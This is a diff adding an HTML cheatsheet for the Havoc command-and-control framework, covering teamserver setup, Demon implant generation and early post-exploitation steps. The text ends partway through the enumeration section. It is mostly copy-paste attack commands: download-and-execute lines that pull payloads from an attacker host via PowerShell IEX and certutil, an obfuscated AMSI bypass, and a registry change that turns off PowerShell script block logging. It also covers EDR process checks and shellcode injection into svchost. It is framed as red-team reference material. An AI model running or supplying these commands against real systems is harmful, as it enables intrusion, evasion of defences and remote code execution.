@@ -1,0 +1,1781 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Havoc C2 — Post-Exploitation Cheatsheet</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Exo+2:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#06080d;--bg2:#090c13;--surf:#0d1219;--surf2:#111a24;--surf3:#162030;
+  --brd:#1a2a3a;--brd2:#223040;
+  --red:#e63946;--orange:#f4730e;--yellow:#f9c74f;--green:#43d97b;
+  --cyan:#00d4ff;--blue:#4895ef;--purple:#b05cf7;--pink:#ff4d8d;--teal:#06d6a0;
+  --text:#c5d8ec;--text2:#6e8fa8;--muted:#344d62;
+  --h-red:#e6394622;--h-orange:#f4730e22;--h-green:#43d97b22;--h-cyan:#00d4ff18;--h-purple:#b05cf722;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:'Exo 2',sans-serif;font-size:13px;line-height:1.6;}
+body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:9998;
+  background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,212,255,.008) 3px,rgba(0,212,255,.008) 4px);}
+
+/* ── HEADER ── */
+header{
+  background:linear-gradient(135deg,#040610 0%,#0a1220 50%,#040610 100%);
+  border-bottom:1px solid var(--red);
+  padding:22px 32px;
+  display:flex;align-items:center;justify-content:space-between;
+  position:sticky;top:0;z-index:100;
+  box-shadow:0 0 40px rgba(230,57,70,.12);
+}
+.brand{display:flex;align-items:center;gap:14px;}
+.brand-icon{
+  width:44px;height:44px;border:2px solid var(--red);border-radius:6px;
+  display:flex;align-items:center;justify-content:center;font-size:20px;
+  background:rgba(230,57,70,.08);box-shadow:0 0 18px rgba(230,57,70,.3);
+}
+.brand-text h1{font-family:'Rajdhani',sans-serif;font-size:22px;font-weight:700;
+  color:var(--red);letter-spacing:3px;text-transform:uppercase;}
+.brand-text p{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;}
+.hdr-right{display:flex;align-items:center;gap:10px;}
+.hpill{font-family:'Share Tech Mono',monospace;font-size:9px;padding:4px 10px;
+  border-radius:20px;border:1px solid;letter-spacing:1px;}
+.hpill.red{color:var(--red);border-color:var(--red);background:var(--h-red);}
+.hpill.green{color:var(--green);border-color:var(--green);background:var(--h-green);}
+.hpill.cyan{color:var(--cyan);border-color:var(--cyan);background:var(--h-cyan);}
+
+/* ── LAYOUT ── */
+.wrap{max-width:1360px;margin:0 auto;padding:0 24px 60px;}
+
+/* ── TOP NAV TABS ── */
+.top-tabs{
+  display:flex;gap:6px;flex-wrap:wrap;
+  padding:18px 0 14px;
+  position:sticky;top:81px;background:var(--bg);z-index:90;
+  border-bottom:1px solid var(--brd);margin-bottom:28px;
+}
+.ttab{
+  font-family:'Share Tech Mono',monospace;font-size:9px;letter-spacing:1.5px;
+  padding:6px 12px;border-radius:4px;border:1px solid var(--brd);
+  background:var(--surf);color:var(--muted);cursor:pointer;
+  text-transform:uppercase;transition:all .15s;white-space:nowrap;
+}
+.ttab:hover{color:var(--text);border-color:var(--brd2);}
+.ttab.active{color:var(--bg);font-weight:700;}
+
+/* ── DEMON STATUS BAR ── */
+.demon-bar{
+  background:var(--surf);border:1px solid var(--brd);border-top:2px solid var(--red);
+  border-radius:6px;padding:12px 16px;margin-bottom:20px;
+  display:flex;align-items:center;gap:16px;flex-wrap:wrap;
+}
+.demon-title{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-right:4px;}
+.demon-field{display:flex;align-items:center;gap:6px;}
+.demon-field label{font-family:'Share Tech Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1px;text-transform:uppercase;}
+.demon-input{
+  background:var(--surf3);border:1px solid var(--brd2);border-radius:3px;
+  color:var(--cyan);font-family:'Share Tech Mono',monospace;font-size:10px;
+  padding:3px 8px;outline:none;width:130px;
+}
+.demon-input:focus{border-color:var(--cyan);}
+.demon-input::placeholder{color:var(--muted);}
+.demon-input.red-inp{color:var(--red);border-color:rgba(230,57,70,.3);}
+.demon-input.red-inp:focus{border-color:var(--red);}
+.priv-toggle{display:flex;gap:4px;}
+.ptog{
+  font-family:'Share Tech Mono',monospace;font-size:8px;padding:3px 8px;
+  border-radius:3px;border:1px solid var(--brd);background:transparent;
+  color:var(--muted);cursor:pointer;letter-spacing:1px;transition:all .15s;
+}
+.ptog.on{font-weight:700;}
+.ptog.medium.on{color:var(--yellow);border-color:var(--yellow);background:rgba(249,199,79,.08);}
+.ptog.high.on{color:var(--orange);border-color:var(--orange);background:rgba(244,115,14,.08);}
+.ptog.system.on{color:var(--red);border-color:var(--red);background:rgba(230,57,70,.08);}
+
+/* ── PHASE SECTIONS ── */
+.phase{margin-bottom:44px;display:none;animation:fadeUp .3s ease;}
+.phase.active{display:block;}
+@keyframes fadeUp{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+.phase-hdr{
+  display:flex;align-items:center;gap:14px;
+  padding:14px 18px;border-radius:7px;border-left:4px solid;
+  background:var(--surf);margin-bottom:18px;
+}
+.ph-num{font-family:'Share Tech Mono',monospace;font-size:9px;letter-spacing:2px;opacity:.6;}
+.ph-title{font-family:'Rajdhani',sans-serif;font-size:20px;font-weight:700;letter-spacing:2px;text-transform:uppercase;}
+.ph-badge{margin-left:auto;font-family:'Share Tech Mono',monospace;font-size:8px;
+  padding:3px 9px;border-radius:20px;border:1px solid currentColor;opacity:.65;}
+.ph-desc{font-size:11px;color:var(--text2);line-height:1.7;margin-bottom:16px;padding:0 2px;}
+
+/* ── CARD GRID ── */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(560px,1fr));gap:14px;}
+.grid.single{grid-template-columns:1fr;}
+.grid.tri{grid-template-columns:repeat(auto-fill,minmax(380px,1fr));}
+
+/* ── CMD CARD ── */
+.cc{
+  background:var(--surf);border:1px solid var(--brd);border-radius:7px;
+  overflow:hidden;transition:border-color .2s;
+}
+.cc:hover{border-color:var(--brd2);}
+.cc-head{
+  display:flex;align-items:center;gap:9px;
+  padding:9px 13px;background:var(--surf2);cursor:pointer;user-select:none;
+}
+.cc-head:hover{background:var(--surf3);}
+.cc-num{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);min-width:28px;}
+.cc-title{font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:600;
+  letter-spacing:1.5px;text-transform:uppercase;flex:1;}
+.cc-tags{display:flex;gap:3px;flex-wrap:wrap;}
+.tag{font-family:'Share Tech Mono',monospace;font-size:7px;padding:2px 5px;
+  border-radius:2px;letter-spacing:1px;text-transform:uppercase;border:1px solid;}
+.tag.opsec {color:#06d6a0;border-color:rgba(6,214,160,.3);background:rgba(6,214,160,.06);}
+.tag.stealth{color:#4895ef;border-color:rgba(72,149,239,.3);background:rgba(72,149,239,.06);}
+.tag.priv  {color:#e63946;border-color:rgba(230,57,70,.3);background:rgba(230,57,70,.06);}
+.tag.creds {color:#b05cf7;border-color:rgba(176,92,247,.3);background:rgba(176,92,247,.06);}
+.tag.lateral{color:#f4730e;border-color:rgba(244,115,14,.3);background:rgba(244,115,14,.06);}
+.tag.enum  {color:#00d4ff;border-color:rgba(0,212,255,.3);background:rgba(0,212,255,.06);}
+.tag.evasion{color:#f9c74f;border-color:rgba(249,199,79,.3);background:rgba(249,199,79,.06);}
+.tag.persist{color:#ff4d8d;border-color:rgba(255,77,141,.3);background:rgba(255,77,141,.06);}
+.tag.inject{color:#f4730e;border-color:rgba(244,115,14,.3);background:rgba(244,115,14,.06);}
+.cc-chev{color:var(--muted);font-size:9px;transition:transform .2s;}
+.cc.open .cc-chev{transform:rotate(180deg);}
+.cc-body{display:none;border-top:1px solid var(--brd);}
+.cc.open .cc-body{display:block;}
+
+/* ── CODE BLOCK ── */
+.cb{margin:0;overflow:hidden;}
+.cb+.cb{border-top:1px solid var(--brd);}
+.cb-label-row{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:6px 13px;background:var(--surf2);border-bottom:1px solid var(--brd);
+}
+.cb-lbl{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--text2);letter-spacing:1px;}
+.cpbtn{
+  font-family:'Share Tech Mono',monospace;font-size:8px;padding:2px 9px;
+  border-radius:2px;border:1px solid rgba(0,212,255,.3);background:rgba(0,212,255,.05);
+  color:var(--cyan);cursor:pointer;transition:all .15s;letter-spacing:1px;
+}
+.cpbtn:hover{background:rgba(0,212,255,.15);}
+.cpbtn.ok{color:var(--green);border-color:var(--green);}
+pre{
+  font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);
+  padding:11px 14px;overflow-x:auto;line-height:1.85;
+  white-space:pre-wrap;word-break:break-all;background:var(--bg);
+}
+pre .cm{color:var(--muted);}
+pre .va{color:var(--cyan);}
+pre .hl{color:var(--yellow);}
+pre .dn{color:var(--red);}
+pre .kw{color:var(--purple);}
+pre .ok{color:var(--green);}
+pre .or{color:var(--orange);}
+
+/* ── ALERT ── */
+.alert{display:flex;gap:10px;align-items:flex-start;padding:9px 13px;
+  border-radius:5px;margin:10px 13px;font-size:11px;line-height:1.55;}
+.alert.info{background:rgba(0,212,255,.07);border:1px solid rgba(0,212,255,.2);color:var(--cyan);}
+.alert.warn{background:rgba(249,199,79,.07);border:1px solid rgba(249,199,79,.2);color:var(--yellow);}
+.alert.danger{background:rgba(230,57,70,.07);border:1px solid rgba(230,57,70,.2);color:var(--red);}
+.alert.success{background:rgba(67,217,123,.07);border:1px solid rgba(67,217,123,.2);color:var(--green);}
+.alert.opsec{background:rgba(6,214,160,.07);border:1px solid rgba(6,214,160,.2);color:var(--teal);}
+
+/* ── OPSEC METER ── */
+.opsec-row{display:flex;align-items:center;gap:8px;padding:7px 13px 0;flex-wrap:wrap;}
+.opsec-label{font-family:'Share Tech Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1px;min-width:60px;}
+.opsec-dots{display:flex;gap:3px;}
+.opsec-dot{width:8px;height:8px;border-radius:50%;background:var(--brd2);}
+.opsec-dot.on.g{background:var(--green);}
+.opsec-dot.on.y{background:var(--yellow);}
+.opsec-dot.on.r{background:var(--red);}
+.opsec-text{font-family:'Share Tech Mono',monospace;font-size:8px;letter-spacing:1px;}
+
+/* ── TABLE ── */
+.ref-table{width:100%;border-collapse:collapse;font-family:'Share Tech Mono',monospace;font-size:9px;margin:10px 0;}
+.ref-table th{background:var(--surf3);color:var(--text2);padding:6px 10px;text-align:left;border:1px solid var(--brd);letter-spacing:1px;}
+.ref-table td{padding:5px 10px;border:1px solid var(--brd);vertical-align:top;line-height:1.6;}
+.ref-table tr:nth-child(even) td{background:var(--surf2);}
+.ref-table .g{color:var(--green);}
+.ref-table .r{color:var(--red);}
+.ref-table .y{color:var(--yellow);}
+.ref-table .c{color:var(--cyan);}
+.ref-table .p{color:var(--purple);}
+
+/* ── FLOW DIAGRAM ── */
+.flow{display:flex;align-items:center;gap:6px;flex-wrap:wrap;padding:10px 13px;background:var(--surf2);border-bottom:1px solid var(--brd);}
+.flow-node{font-family:'Share Tech Mono',monospace;font-size:9px;padding:4px 9px;border-radius:3px;border:1px solid var(--brd2);background:var(--surf3);color:var(--text2);}
+.flow-node.done{color:var(--green);border-color:rgba(67,217,123,.3);background:rgba(67,217,123,.06);}
+.flow-node.active{color:var(--cyan);border-color:var(--cyan);background:rgba(0,212,255,.08);}
+.flow-node.warn{color:var(--red);border-color:rgba(230,57,70,.3);background:rgba(230,57,70,.06);}
+.flow-arr{color:var(--muted);font-size:10px;}
+
+/* ── SECTION LABEL ── */
+.slabel{font-family:'Share Tech Mono',monospace;font-size:8px;color:var(--muted);
+  letter-spacing:2px;text-transform:uppercase;padding:10px 13px 4px;}
+
+/* ── CHECKLIST ── */
+.checklist{padding:6px 13px 10px;}
+.cli{display:flex;align-items:center;gap:8px;padding:5px 8px;border:1px solid var(--brd);
+  border-radius:4px;background:var(--surf2);cursor:pointer;transition:all .15s;margin-bottom:4px;}
+.cli:hover{background:var(--surf3);}
+.cli-box{width:13px;height:13px;min-width:13px;border:1px solid var(--brd2);border-radius:2px;
+  display:flex;align-items:center;justify-content:center;font-size:8px;color:transparent;transition:all .15s;}
+.cli.chk .cli-box{background:var(--green);border-color:var(--green);color:var(--bg);}
+.cli.chk{opacity:.55;text-decoration:line-through;}
+.cli-text{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--text2);}
+
+/* ── SCROLL TOP ── */
+.scrtop{position:fixed;bottom:22px;right:22px;width:36px;height:36px;border-radius:50%;
+  background:var(--surf2);border:1px solid var(--red);color:var(--red);
+  font-size:14px;cursor:pointer;display:none;align-items:center;justify-content:center;
+  transition:all .2s;z-index:200;}
+.scrtop.show{display:flex;}
+.scrtop:hover{background:var(--red);color:var(--bg);}
+
+/* ── UTILITY ── */
+.divider{height:1px;background:var(--brd);margin:10px 13px;}
+.mt8{margin-top:8px;}.mb0{margin-bottom:0;}
+.pad{padding:10px 13px;}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="brand">
+    <div class="brand-icon">👹</div>
+    <div class="brand-text">
+      <h1>Havoc C2</h1>
+      <p>POST-EXPLOITATION CHEATSHEET — AUTHORIZED USE ONLY</p>
+    </div>
+  </div>
+  <div class="hdr-right">
+    <span class="hpill red">DEMON AGENT</span>
+    <span class="hpill cyan">AD FOCUSED</span>
+    <span class="hpill green">COPY-PASTE READY</span>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <!-- DEMON SESSION BAR -->
+  <div class="demon-bar" style="margin-top:20px;">
+    <span class="demon-title">SESSION:</span>
+    <div class="demon-field">
+      <label>Listener</label>
+      <input class="demon-input" id="di_listener" placeholder="https" oninput="sync()">
+    </div>
+    <div class="demon-field">
+      <label>LHOST</label>
+      <input class="demon-input" id="di_lhost" placeholder="10.10.14.5" oninput="sync()">
+    </div>
+    <div class="demon-field">
+      <label>LPORT</label>
+      <input class="demon-input" id="di_lport" placeholder="443" style="width:70px" oninput="sync()">
+    </div>
+    <div class="demon-field">
+      <label>Target Domain</label>
+      <input class="demon-input" id="di_domain" placeholder="corp.local" oninput="sync()">
+    </div>
+    <div class="demon-field">
+      <label>DC IP</label>
+      <input class="demon-input" id="di_dcip" placeholder="192.168.1.10" oninput="sync()">
+    </div>
+    <div class="demon-field">
+      <label>Privilege</label>
+      <div class="priv-toggle">
+        <button class="ptog medium" onclick="setPriv('medium',this)">Medium</button>
+        <button class="ptog high" onclick="setPriv('high',this)">High</button>
+        <button class="ptog system on" onclick="setPriv('system',this)">SYSTEM</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE TABS -->
+  <div class="top-tabs" id="topTabs">
+    <button class="ttab active" onclick="show('s0',this)">0 · SETUP</button>
+    <button class="ttab" onclick="show('s1',this)">1 · FIRST STEPS</button>
+    <button class="ttab" onclick="show('s2',this)">2 · SITUATIONAL AWARENESS</button>
+    <button class="ttab" onclick="show('s3',this)">3 · TOKEN &amp; PRIVILEGE</button>
+    <button class="ttab" onclick="show('s4',this)">4 · CREDENTIAL ACCESS</button>
+    <button class="ttab" onclick="show('s5',this)">5 · LATERAL MOVEMENT</button>
+    <button class="ttab" onclick="show('s6',this)">6 · AD ATTACKS</button>
+    <button class="ttab" onclick="show('s7',this)">7 · EVASION &amp; OPSEC</button>
+    <button class="ttab" onclick="show('s8',this)">8 · PERSISTENCE</button>
+    <button class="ttab" onclick="show('s9',this)">9 · CLEANUP</button>
+  </div>
+
+  <!-- ═══════════════ PHASE 0: SETUP ═══════════════ -->
+  <div class="phase active" id="s0">
+    <div class="phase-hdr" style="border-left-color:#e63946;background:linear-gradient(90deg,rgba(230,57,70,.06),var(--surf))">
+      <span class="ph-num">PHASE 00</span>
+      <span class="ph-title" style="color:#e63946">Setup &amp; Installation</span>
+      <span class="ph-badge" style="color:#e63946">PRE-ENGAGEMENT</span>
+    </div>
+    <div class="ph-desc">Install Havoc, configure teamserver, create listeners, and generate Demon agents before the engagement.</div>
+
+    <div class="grid">
+
+      <div class="cc open">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">0.1</span>
+          <span class="cc-title">Install Havoc Framework</span>
+          <span class="cc-tags"><span class="tag opsec">server</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Clone + build Havoc (Go 1.18+ required)</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Clone repository</span>
+git clone https://github.com/HavocFramework/Havoc.git
+cd Havoc
+
+<span class="cm"># Install dependencies (Debian/Kali)</span>
+sudo apt install -y golang-go mingw-w64 nasm python3-dev \
+  libssl-dev libffi-dev build-essential cmake python3-pip
+
+<span class="cm"># Build teamserver</span>
+cd teamserver
+go mod download
+go build .
+cd ..
+
+<span class="cm"># Build client (Starkiller-like GUI)</span>
+cd client
+npm install && npm run build
+cd ..
+
+<span class="cm"># Python dependencies for Havoc modules</span>
+pip3 install havoc</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc open">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">0.2</span>
+          <span class="cc-title">Teamserver Configuration</span>
+          <span class="cc-tags"><span class="tag opsec">server</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">havoc.yaotl — teamserver profile</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># /etc/havoc/havoc.yaotl (or wherever you keep it)</span>
+Teamserver {
+    Host = "<span class="va">0.0.0.0</span>"
+    Port = <span class="va">40056</span>
+    Build {
+        Compiler64 = "<span class="va">/usr/bin/x86_64-w64-mingw32-gcc</span>"
+        Compiler86 = "<span class="va">/usr/bin/i686-w64-mingw32-gcc</span>"
+        Nasm = "<span class="va">/usr/bin/nasm</span>"
+    }
+}
+
+Operators {
+    operator "<span class="va">operator1</span>" {
+        Password = "<span class="va">ChangeMe123!</span>"
+    }
+}
+
+Listeners {
+    Http {
+        Name = "<span class="va">https-main</span>"
+        Hosts = ["<span class="va">LHOST</span>"]
+        HostBind = "<span class="va">0.0.0.0</span>"
+        PortBind = <span class="va">443</span>
+        PortConn = <span class="va">443</span>
+        HostRotation = "round-robin"
+        Secure = <span class="va">true</span>
+        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        Headers = [
+            "Content-type: application/octet-stream",
+            "X-Correlation-ID: {random}"
+        ]
+        Uris = [
+            "/jquery-3.3.1.min.js",
+            "/login",
+            "/api/v1/auth",
+            "/assets/bundle.js"
+        ]
+        Response {
+            Headers = ["Content-type: text/html; charset=utf-8"]
+        }
+    }
+}</pre>
+          </div>
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Start teamserver</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Start server with profile</span>
+sudo ./teamserver/teamserver server --profile ./havoc.yaotl
+
+<span class="cm"># Start client (connect to teamserver)</span>
+./client/Havoc
+<span class="cm"># Connect: host 127.0.0.1, port 40056, operator + password from profile</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc open">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">0.3</span>
+          <span class="cc-title">Generate Demon Agent</span>
+          <span class="cc-tags"><span class="tag evasion">payload</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="alert info">ℹ️&nbsp; Demon is Havoc's native implant. Generate via GUI: Payloads → Generate → Demon. All options below map to the GUI fields.</div>
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Key payload generation options</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Recommended Demon config for AD engagements:</span>
+Format       : Windows Exe / Shellcode (shellcode preferred for injection)
+Listener     : https-main
+Architecture : x64
+Config:
+  Sleep        : 5  (seconds — increase for stealth: 30-60)
+  Jitter       : 20 (% jitter on sleep — randomises beaconing)
+  Indirect Syscalls : Enabled
+  Stack Spoof  : Enabled
+  Sleep Mask   : Enabled  (obfuscates in-memory beacon)
+  AMSI/ETW     : Patch (patches both on execution)
+  Injection    : NtQueueApcThread / NtCreateThread
+  Process Spawn: C:\Windows\System32\notepad.exe (for post-ex jobs)</pre>
+          </div>
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Delivery via Python HTTP server</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Host payload</span>
+cd /path/to/payload/directory
+python3 -m http.server 8080
+
+<span class="cm"># Target download + execute (PowerShell)</span>
+IEX(New-Object Net.WebClient).DownloadString('http://<span class="va">LHOST</span>:8080/run.ps1')
+
+<span class="cm"># Certutil (LOLBin)</span>
+certutil -urlcache -split -f http://<span class="va">LHOST</span>:8080/demon.exe C:\Windows\Temp\svc.exe
+C:\Windows\Temp\svc.exe
+
+<span class="cm"># Via existing CME/impacket session:</span>
+crackmapexec smb <span class="va">TARGET</span> -u '<span class="va">user</span>' -p '<span class="va">pass</span>' --put-file demon.exe \\Windows\\Temp\\svc.exe
+crackmapexec smb <span class="va">TARGET</span> -u '<span class="va">user</span>' -p '<span class="va">pass</span>' -x 'C:\Windows\Temp\svc.exe'</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc open">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">0.4</span>
+          <span class="cc-title">Listener Types Reference</span>
+          <span class="cc-tags"><span class="tag opsec">infra</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="pad">
+          <table class="ref-table">
+            <tr><th>Listener</th><th>Use Case</th><th>Detection Risk</th><th>Notes</th></tr>
+            <tr><td class="c">HTTP/HTTPS</td><td>Default, most compatible</td><td class="y">Medium</td><td>Use malleable profile + CDN for stealth</td></tr>
+            <tr><td class="c">SMB Named Pipe</td><td>Internal pivoting, no egress needed</td><td class="g">Low</td><td>Peer-to-peer between Demons, no internet needed</td></tr>
+            <tr><td class="c">TCP</td><td>Internal pivoting</td><td class="g">Low</td><td>Bind or reverse, good for air-gapped segments</td></tr>
+            <tr><td class="c">External C2</td><td>Custom transport (Slack, DNS, etc.)</td><td class="g">Very Low</td><td>Requires ExternalC2 server implementation</td></tr>
+          </table>
+          </div>
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">SMB listener for internal pivoting</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Add SMB listener in Havoc GUI then pivot via:</span>
+<span class="cm"># On parent Demon (Demon Console):</span>
+pivot add smb <span class="va">TARGET_IP</span> \\.\pipe\havoc_smb
+
+<span class="cm"># Link child Demon back to parent:</span>
+link <span class="va">CHILD_DEMON_ID</span></pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div><!-- /s0 -->
+
+  <!-- ═══════════════ PHASE 1: FIRST STEPS ═══════════════ -->
+  <div class="phase" id="s1">
+    <div class="phase-hdr" style="border-left-color:#f4730e;background:linear-gradient(90deg,rgba(244,115,14,.06),var(--surf))">
+      <span class="ph-num">PHASE 01</span>
+      <span class="ph-title" style="color:#f4730e">First Steps After Callback</span>
+      <span class="ph-badge" style="color:#f4730e">INITIAL ACCESS</span>
+    </div>
+    <div class="ph-desc">You have a Demon callback. The first 60 seconds matter most — establish persistence of the session, identify your context, disable defences, and avoid triggering detections before you've mapped the environment.</div>
+
+    <div class="grid single">
+
+      <div class="cc open">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">1.1</span>
+          <span class="cc-title">Immediate Triage — First Commands</span>
+          <span class="cc-tags"><span class="tag enum">recon</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="flow">
+            <span class="flow-node active">Callback</span><span class="flow-arr">→</span>
+            <span class="flow-node">Who am I?</span><span class="flow-arr">→</span>
+            <span class="flow-node">Where am I?</span><span class="flow-arr">→</span>
+            <span class="flow-node">What defences?</span><span class="flow-arr">→</span>
+            <span class="flow-node">Escalate/persist</span>
+          </div>
+          <div class="alert warn">⚠️&nbsp; Increase sleep immediately if in a production environment. Default 5s beacon interval will trigger NDR/EDR alerts quickly.</div>
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Demon Console — first 10 commands on every callback</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># 1. Increase sleep + jitter immediately</span>
+sleep 30 20
+
+<span class="cm"># 2. Who are you</span>
+whoami /all
+getuid
+
+<span class="cm"># 3. Where are you</span>
+hostname
+ipconfig /all
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Domain"
+
+<span class="cm"># 4. Process context + PID</span>
+ps
+getpid
+
+<span class="cm"># 5. Current working directory</span>
+pwd
+
+<span class="cm"># 6. Check for AV / EDR (quick)</span>
+shell sc query type= all | findstr -i "defend carbon crowd sentinel"
+shell tasklist | findstr -i "MsMpEng CylanceSvc csfalcon SentinelAgent"
+
+<span class="cm"># 7. Check token integrity level</span>
+token whoami
+
+<span class="cm"># 8. Network interfaces + routes</span>
+shell ipconfig /all
+shell route print
+
+<span class="cm"># 9. Local users and groups</span>
+shell net localgroup administrators
+shell net user
+
+<span class="cm"># 10. Domain / forest check</span>
+shell nltest /dsgetdc:<span class="va">DOMAIN</span>
+shell echo %USERDOMAIN% %LOGONSERVER%</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">1.2</span>
+          <span class="cc-title">AMSI &amp; ETW Bypass</span>
+          <span class="cc-tags"><span class="tag evasion">evasion</span><span class="tag opsec">opsec</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="alert opsec">🛡️&nbsp; Demon patches AMSI and ETW automatically on callback if configured in payload profile. Verify it worked before running noisy modules.</div>
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">AMSI / ETW patch + verify</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Havoc Demon patches AMSI+ETW on spawn if set in config.</span>
+<span class="cm"># Verify AMSI is patched (should return empty/error):</span>
+dotnet inline-execute /path/to/Seatbelt.exe AntiVirus
+
+<span class="cm"># Manual AMSI patch via PowerShell module (fallback):</span>
+powershell [Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('amsiIn'+'itFailed','NonPublic,Static').GetValue($null),1)
+
+<span class="cm"># ETW patch (ntdll!EtwEventWrite → ret 0)</span>
+<span class="cm"># Demon does this natively — check with:</span>
+shell reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
+
+<span class="cm"># Disable Script Block Logging if admin:</span>
+shell reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">1.3</span>
+          <span class="cc-title">Process Migration</span>
+          <span class="cc-tags"><span class="tag opsec">opsec</span><span class="tag evasion">evasion</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="alert warn">⚠️&nbsp; Migrate out of initial process quickly — delivery vehicles (Office, browsers, LOLBins) are highly monitored. Migrate into a stable, less-watched process.</div>
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Process migration in Demon Console</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># List running processes to find a good target</span>
+ps
+
+<span class="cm"># Good migration targets (stable, long-running, less monitored):</span>
+<span class="cm"># svchost.exe, RuntimeBroker.exe, dllhost.exe, WmiPrvSE.exe</span>
+<span class="cm"># explorer.exe (if user context), spoolsv.exe</span>
+
+<span class="cm"># Migrate to PID</span>
+inject shellcode <span class="va">TARGET_PID</span> x64 self
+<span class="cm"># OR spawn + inject into new process:</span>
+inject spawn x64 "C:\Windows\System32\svchost.exe" self
+
+<span class="cm"># After migration — verify new context:</span>
+getuid
+getpid
+ps | grep <span class="va">TARGET_PID</span></pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div><!-- /s1 -->
+
+  <!-- ═══════════════ PHASE 2: SITUATIONAL AWARENESS ═══════════════ -->
+  <div class="phase" id="s2">
+    <div class="phase-hdr" style="border-left-color:#00d4ff;background:linear-gradient(90deg,rgba(0,212,255,.06),var(--surf))">
+      <span class="ph-num">PHASE 02</span>
+      <span class="ph-title" style="color:#00d4ff">Situational Awareness</span>
+      <span class="ph-badge" style="color:#00d4ff">ENUMERATION</span>
+    </div>
+    <div class="ph-desc">Map the local machine, network, domain, and running processes. Use Seatbelt for automated host recon and PowerShell/shell for domain enumeration.</div>
+
+    <div class="grid">
+
+      <div class="cc open">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">2.1</span>
+          <span class="cc-title">Seatbelt — Automated Host Recon</span>
+          <span class="cc-tags"><span class="tag enum">enum</span><span class="tag opsec">in-memory</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
